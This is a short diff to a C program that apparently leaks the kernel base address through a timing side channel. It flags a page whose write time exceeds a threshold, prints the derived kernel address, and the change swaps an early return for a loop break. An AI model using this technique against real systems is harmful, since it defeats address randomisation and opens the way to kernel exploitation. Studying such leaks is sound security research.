@@ -79,13 +79,15 @@ int main() {
         }
 
         // check if any writes took longer than the threshold
+        bool should_exit = false;
         for (uint64_t i = 0; i < 512; i++) {
             if (results[i] > MERGE_THRESHOLD) {
                 printf("detected merged page at index %#03lx\n", i);
                 printf("kernel base = %p\n", (void *)0xffffffff80000000 + (i << 21));
-                return 0;
+                should_exit = true;
             }
         }
+        if (should_exit) break;
 
         // sleep before retrying
         sleep(20);
